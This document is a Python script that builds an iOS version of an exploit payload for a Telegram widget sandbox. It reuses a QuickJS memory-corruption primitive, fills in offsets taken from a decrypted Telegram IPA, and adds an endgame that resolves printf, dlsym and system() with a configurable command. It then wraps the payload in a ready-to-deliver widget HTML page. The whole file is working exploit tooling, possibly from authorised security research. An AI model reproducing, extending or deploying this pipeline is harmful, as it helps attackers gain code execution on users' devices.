#!/usr/bin/env python3
"""Build the iOS variant of the Android #1827 widget payload.

The QuickJS primitive (PR #1827 -> arbitrary read/write -> JSRuntime) is
unchanged: the iOS widget sandbox uses the same quickjs-ng build.  Only the
endgame differs.  This script:

  1. takes `device_payload_v7_universal.js` (the Android v7 payload),
  2. injects iOS CFG fields,
  3. replaces the `system()`/ELF tail with `ios_endgame.js`,
  4. optionally reads the decrypted 13.2.0 IPA with analyze_bundle.py and
     fills JS_DEF_FREE / STUB_PRINTF / STUB_FFLUSH automatically.

Usage
-----
  # after decrypting and pulling the 13.2.0 IPA:
  make_ios_payload.py --ipa Telegram_13.2.0.ipa

  # explicit offsets (from analyze_bundle.py --stubs):
  make_ios_payload.py \
      --js-def-free 0x3127cd8 \
      --stub-printf 0x5493a20 \
      --stub-fflush 0x5492f40

  # no IPA yet: build with placeholders and print a warning
  make_ios_payload.py --out /tmp/ios_payload_v1.js
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_ANDROID = os.path.normpath(os.path.join(
    HERE, "..", "..", "telegramandroidwidget", "lab", "regexp1827_class64",
    "device_payload_v7_universal.js"))
DEFAULT_ENDGAME = os.path.join(HERE, "ios_endgame.js")
DEFAULT_OUT = os.path.join(HERE, "device_payload_ios_v1.js")
ANALYZER = os.path.join(HERE, "analyze_bundle.py")


def offsets_from_ipa(ipa: str) -> dict:
    """Run analyze_bundle.py --json and pick the quickjs image."""
    fd, tmp = tempfile.mkstemp(prefix="ios_port_", suffix=".json")
    os.close(fd)
    try:
        subprocess.run(
            [sys.executable, ANALYZER, "--ipa", ipa, "--stubs", "--json", tmp],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        with open(tmp) as f:
            report = json.load(f)
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass

    best = None
    for img in report.get("images", []):
        alloc = img.get("alloc") or {}
        stubs = img.get("stubs") or {}
        if ("_printf" in stubs or "_puts" in stubs) and img.get("alloc"):
            best = (img, alloc, stubs)
            break
    if not best:
        # Fall back to any image that imports printf/puts (the allocator block
        # may not be recognized on a new codegen; the payload then scans for
        # the Mach-O base at runtime).
        for img in report.get("images", []):
            stubs = img.get("stubs") or {}
            if "_printf" in stubs or "_puts" in stubs:
                best = (img, img.get("alloc") or {}, stubs)
                break
    if not best:
        raise SystemExit("analyzer found no Mach-O image with printf/puts stubs")
    img, alloc, stubs = best
    return {
        "image": img.get("path"),
        "js_def_free": int(alloc["js_def_free"], 16) if alloc.get("js_def_free") else 0,
        "js_def_malloc": int(alloc["js_def_malloc"], 16) if alloc.get("js_def_malloc") else 0,
        "stub_printf": int(stubs["_printf"]["offset"], 16) if "_printf" in stubs else 0,
        "stub_puts": int(stubs["_puts"]["offset"], 16) if "_puts" in stubs else 0,
        "stub_fflush": int(stubs["_fflush"]["offset"], 16) if "_fflush" in stubs else 0,
        "stub_dlsym": int(stubs["_dlsym"]["offset"], 16) if "_dlsym" in stubs else 0,
        "image_base": int(img.get("image_base", 0)),
    }


def inject_cfg(src: str, cfg: dict) -> str:
    i = src.find("var CFG = {")
    if i < 0:
        raise SystemExit("CFG block not found in the Android payload")
    j = src.find("\n", i)
    fields = [
        "  /* --- iOS endgame (filled by make_ios_payload.py) --- */",
        "  JS_DEF_FREE: %s," % hex(cfg["js_def_free"]),
    ]
    if not cfg.get("min_cfg"):
        fields += [
        "  JS_DEF_MALLOC: %s," % hex(cfg.get("js_def_malloc", 0)),
        "  STUB_PRINTF: %s," % hex(cfg["stub_printf"]),
        "  STUB_PUTS: %s," % hex(cfg.get("stub_puts", 0)),
        "  STUB_FFLUSH: %s," % hex(cfg["stub_fflush"]),
        "  PROOF_ADDR: %s," % hex(cfg.get("proof_addr", 0)),
        "  FFLUSH_ADDR: %s," % hex(cfg.get("fflush_addr", 0)),
        "  STUB_DLSYM: %s," % hex(cfg.get("stub_dlsym", 0)),
        "  SYSTEM_ADDR: %s," % hex(cfg.get("system_addr", 0)),
        "  SYSTEM_DELTA: %s," % int(cfg.get("system_delta", 0)),
        "  MARKER: %s," % json.dumps(cfg.get("marker", "IOSPORT_R1827_OK\\n")),
        ]
    # Drop any previous iOS injection (idempotent re-runs).
    src = re.sub(r"  /\* --- iOS endgame.*?\n(?:  [A-Z_]+: .*\n)+", "", src,
                 flags=re.S)
    i = src.find("var CFG = {")
    j = src.find("\n", i)
    return src[:j + 1] + "\n".join(fields) + "\n" + src[j + 1:]


def replace_tail(src: str, endgame: str) -> str:
    marker = "/* ---------------- system() address"
    i = src.find(marker)
    if i < 0:
        raise SystemExit("Android endgame marker not found")
    return src[:i] + endgame.rstrip() + "\n})();\n"


def add_dom_progress(src: str) -> str:
    """Make setres() mirror its marker into #iosout (visible in the widget)."""
    needle = "console.log('R1827:' + s);"
    if needle not in src:
        return src
    inject = (needle + " } catch (e) {}\n"
              "  try { if (typeof document !== 'undefined' && document && "
              "document.getElementById) { var __o = document.getElementById('iosout'); "
              "if (__o) __o.textContent = String(s); } } catch (e) {}")
    return src.replace(needle + " } catch (e) {}", inject, 1)


def widget_html(payload: str) -> str:
    if "</script" in payload.lower():
        raise SystemExit("payload contains </script>; escape it before wrapping")
    return ("<!doctype html><html><head><meta charset=\"utf-8\">"
            "<style>body{font:14px -apple-system,sans-serif;margin:8px}"
            "#iosout{white-space:pre-wrap;word-break:break-all}</style></head><body>"
            "<div id=\"iosout\">boot</div>\n<script>\n" + payload +
            "\n</script></body></html>\n")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--android-payload", default=DEFAULT_ANDROID)
    ap.add_argument("--endgame", default=DEFAULT_ENDGAME)
    ap.add_argument("--ipa", help="decrypted 13.2.0 IPA (auto offsets)")
    ap.add_argument("--js-def-free", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--js-def-malloc", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--stub-printf", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--stub-puts", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--stub-fflush", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--stub-dlsym", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--proof-addr", type=lambda x: int(x, 0), default=0,
                    help="absolute printf/puts address (Frida fallback; "
                         "overrides the stub offset)")
    ap.add_argument("--fflush-addr", type=lambda x: int(x, 0), default=0,
                    help="absolute fflush address (Frida fallback)")
    ap.add_argument("--system-addr", type=lambda x: int(x, 0), default=0,
                    help="absolute libc system() if you already resolved it "
                         "(use only when /bin/sh exists)")
    ap.add_argument("--system-delta", type=lambda x: int(x, 0), default=0,
                    help="system - free delta for the dyld shared cache "
                         "(iOS: resolved at runtime from js_def_free PLT)")
    ap.add_argument("--marker", default="IOSPORT_R1827_OK")
    ap.add_argument("--cmd", default="echo IOSPORT_SYSTEM_OK",
                    help="command string for the optional system() path")
    ap.add_argument("--dbg", action="store_true",
                    help="set CFG.DBG=1 (more on-screen markers, slower)")
    ap.add_argument("--system-only", action="store_true",
                    help="drop the printf/fflush proof tail (smaller widget)")
    ap.add_argument("--min-cfg", action="store_true",
                    help="inject only JS_DEF_FREE into CFG (smaller widget)")
    ap.add_argument("--minify", action="store_true",
                    help="run terser on the payload (smaller code block)")
    ap.add_argument("--out", default=DEFAULT_OUT)
    ap.add_argument("--html-out", default=os.path.join(HERE, "device_widget_ios_v1.html"),
                    help="complete tgwidget HTML wrapper (default: next to this script)")
    args = ap.parse_args()

    cfg = {
        "js_def_free": args.js_def_free,
        "js_def_malloc": args.js_def_malloc,
        "stub_printf": args.stub_printf,
        "stub_puts": args.stub_puts,
        "stub_fflush": args.stub_fflush,
        "stub_dlsym": args.stub_dlsym,
        "proof_addr": args.proof_addr,
        "fflush_addr": args.fflush_addr,
        "system_addr": args.system_addr,
        "system_delta": args.system_delta,
        "marker": args.marker + "\n",
        "min_cfg": args.min_cfg,
    }
    if args.ipa:
        auto = offsets_from_ipa(args.ipa)
        cfg.update({k: auto[k] for k in
                    ("js_def_free", "js_def_malloc", "stub_printf",
                     "stub_puts", "stub_fflush", "stub_dlsym")})
        print("IPA offsets from %s:" % auto["image"])
        for k in ("js_def_free", "js_def_malloc", "stub_printf",
                  "stub_puts", "stub_fflush", "stub_dlsym"):
            print("  %-12s %#x" % (k, auto[k]))

    src = open(args.android_payload).read()
    endgame = open(args.endgame).read()
    if args.system_only:
        cut = endgame.find("/* ---- 2b. printf/puts(marker) proof")
        if cut < 0:
            raise SystemExit("--system-only: proof marker not found in endgame")
        endgame = endgame[:cut]
    src = re.sub(r'  CMD: ".*?",\n', "  CMD: %s,\n" % json.dumps(args.cmd),
                 src, count=1)
    src = re.sub(r'  SYSTEM_DELTA: .*?,\n', '', src, count=1)
    if args.dbg:
        src = re.sub(r"\bDBG:\s*0\b", "DBG: 1", src, count=1)
    out = add_dom_progress(replace_tail(inject_cfg(src, cfg), endgame))
    with open(args.out, "w") as f:
        f.write(out)
    if args.minify:
        tmp = args.out + ".min.tmp"
        try:
            subprocess.run(["terser", args.out, "--compress", "--mangle",
                            "-o", tmp], check=True, stderr=subprocess.PIPE)
            os.replace(tmp, args.out)
        except FileNotFoundError:
            print("WARNING: terser not found; leaving the payload unminified")
        except subprocess.CalledProcessError as exc:
            print("WARNING: terser failed (%s); leaving it unminified" % exc)
            try:
                os.unlink(tmp)
            except OSError:
                pass
    out = open(args.out).read()
    html = widget_html(out)
    with open(args.html_out, "w") as f:
        f.write(html)

    print("wrote %s (%d bytes)" % (args.out, len(out)))
    print("wrote %s (%d bytes, complete tgwidget document)" %
          (args.html_out, len(html)))
    if not cfg["stub_printf"]:
        print("WARNING: STUB_PRINTF is 0; the payload will stop at "
              "IOS_NO_PRINTF_STUB. Run again with --ipa (or --stub-printf).")
    if not cfg["js_def_free"]:
        print("WARNING: JS_DEF_FREE is 0; the payload will use the 16 KiB "
              "Mach-O base scan instead of the exact offset.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
